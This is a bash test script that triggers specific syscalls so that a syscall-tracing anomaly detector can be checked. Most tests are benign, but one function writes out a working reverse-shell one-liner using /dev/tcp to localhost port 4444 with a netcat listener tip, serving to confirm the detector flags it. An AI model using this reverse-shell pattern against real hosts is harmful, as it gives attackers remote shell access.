#!/usr/bin/env bash
#
# Test cases for trace_syscalls.py / pipeline.py
#
# Each function below deliberately triggers ONE specific syscall from the
# monitored list, so you can confirm the tracer picks it up. Run the
# tracer/pipeline in one terminal, then run these in another and watch
# for matching events.
#
# Usage:
#   chmod +x test_cases.sh
#   ./test_cases.sh execve
#   ./test_cases.sh all          # runs every test in sequence, with pauses
#   ./test_cases.sh attack       # runs the full reverse-shell attack chain
#
# Run trace_syscalls.py / pipeline.py with sudo in another terminal FIRST.

set -u

pause() { echo "--- press Enter to continue ---"; read -r _; }

test_execve() {
    echo "[TEST] execve -> running 'ls', 'whoami', 'date'"
    ls >/dev/null
    whoami >/dev/null
    date >/dev/null
    echo "Expect: 3x execve events for pid(s) of ls/whoami/date"
}

test_connect() {
    echo "[TEST] connect -> curl to a real host"
    curl -s -m 3 https://example.com >/dev/null
    echo "Expect: connect event(s) for pid of curl"
}

test_socket() {
    echo "[TEST] socket -> python opens a raw socket (no connect)"
    python3 - <<'EOF'
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.close()
EOF
    echo "Expect: socket event for pid of python3"
}

test_ptrace() {
    echo "[TEST] ptrace -> strace attaching to a short-lived process"
    if command -v strace >/dev/null; then
        strace -e trace=none -c sleep 1 2>/dev/null
    else
        echo "strace not installed - skipping (sudo apt install strace)"
    fi
    echo "Expect: ptrace event for pid of strace"
}

test_setuid() {
    echo "[TEST] setuid -> sudo launching a subprocess"
    sudo -n true 2>/dev/null || echo "(sudo -n needs passwordless sudo cached; run 'sudo -v' first if this fails)"
    echo "Expect: setuid event around sudo's pid"
}

test_dup2() {
    echo "[TEST] dup2 -> shell redirection triggers fd duplication"
    bash -c 'echo hello > /tmp/dup2_test.txt 2>&1'
    rm -f /tmp/dup2_test.txt
    echo "Expect: dup2 event for pid of the bash subshell"
}

test_openat() {
    echo "[TEST] openat -> reading a file"
    cat /etc/hostname >/dev/null
    echo "Expect: openat event for pid of cat"
}

test_unlinkat() {
    echo "[TEST] unlinkat -> deleting a temp file"
    touch /tmp/unlinkat_test.txt
    rm -f /tmp/unlinkat_test.txt
    echo "Expect: unlinkat event for pid of rm"
}

test_chmod() {
    echo "[TEST] chmod -> changing permissions on a temp file"
    touch /tmp/chmod_test.txt
    chmod +x /tmp/chmod_test.txt
    rm -f /tmp/chmod_test.txt
    echo "Expect: chmod event for pid of chmod"
}

test_clone() {
    echo "[TEST] clone -> shell forking a background subprocess"
    ( sleep 1 & )
    echo "Expect: clone event for pid of the forked subshell"
}

# --- The real attack simulation: full reverse-shell syscall chain ---
# socket -> connect -> dup2 -> execve, in order, matching is_anomalous()
# Needs a listener on the target port to complete cleanly, but the
# detector fires on the syscall attempt regardless of connection success.
test_attack_reverse_shell() {
    echo "[ATTACK SIM] Reverse shell pattern: socket -> connect -> dup2 -> execve"
    echo "Tip: run 'nc -lvp 4444' in another terminal first for a clean connect."
    echo "Attempting connection to 127.0.0.1:4444 ..."
    bash -c 'exec 5<>/dev/tcp/127.0.0.1/4444; exec 0<&5 1>&5 2>&5; exec /bin/sh -c "echo test"' 2>&1
    echo "Expect: *** ANOMALY DETECTED *** + [QUARANTINED] in the pipeline output"
}

run_all() {
    for fn in test_execve test_connect test_socket test_ptrace test_setuid \
              test_dup2 test_openat test_unlinkat test_chmod test_clone; do
        $fn
        pause
    done
}

case "${1:-}" in
    execve)   test_execve ;;
    connect)  test_connect ;;
    socket)   test_socket ;;
    ptrace)   test_ptrace ;;
    setuid)   test_setuid ;;
    dup2)     test_dup2 ;;
    openat)   test_openat ;;
    unlinkat) test_unlinkat ;;
    chmod)    test_chmod ;;
    clone)    test_clone ;;
    attack)   test_attack_reverse_shell ;;
    all)      run_all ;;
    *)
        echo "Usage: $0 {execve|connect|socket|ptrace|setuid|dup2|openat|unlinkat|chmod|clone|attack|all}"
        exit 1
        ;;
esac
